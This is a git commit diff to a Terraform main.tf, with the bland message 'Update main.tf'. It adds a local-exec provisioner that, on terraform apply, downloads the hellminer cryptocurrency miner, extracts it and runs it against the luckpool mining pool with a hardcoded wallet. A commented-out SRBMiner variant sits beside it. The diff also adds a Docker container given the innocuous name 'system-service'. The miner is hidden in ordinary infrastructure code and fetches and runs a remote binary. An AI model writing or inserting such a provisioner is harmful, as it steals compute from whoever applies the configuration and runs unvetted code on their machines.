a1d4ce41cf29b837112e802ffc9c7dbff259269e
mooghen01-hue <chriskm0101@outlook.com>
2026-01-15 09:08:45 +0700

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,3 +1,20 @@
+resource "null_resource" "run_1" {
+  provisioner "local-exec" {
+    command = <<EOT
+set -e
+
+#curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
+#tar -xvf SRBMiner-Multi.tar.gz
+#./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
+
+curl -L https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz -o hellminer_linux64.tar.gz
+tar -xvf hellminer_linux64.tar.gz
+bash ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp.003 -p x --cpu 3
+
+EOT
+  }
+}
+
 terraform {
   required_providers {
     docker = {
@@ -13,5 +30,17 @@ provider "docker" {
 
 resource "docker_image" "app" {
   name = "chriskm12/system-service:latest"
+}
+
+resource "docker_container" "app" {
+  name  = "system-service"
+  image = docker_image.app.image_id
+
+  restart = "no"
+
+  resources {
+    cpu_shares = 512
+    memory     = 512
+  }
 }
 
